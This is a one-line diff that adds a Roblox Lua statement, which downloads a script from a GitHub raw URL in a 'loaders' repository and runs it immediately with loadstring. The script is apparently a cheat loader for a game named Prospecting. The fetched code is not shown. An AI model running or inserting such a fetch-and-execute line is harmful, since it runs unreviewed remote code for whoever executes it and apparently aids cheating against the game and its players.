@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GrandeurMare/loaders/main/loaders/prospecting-spam0-welc5w7wgy1c6x.lua"))()
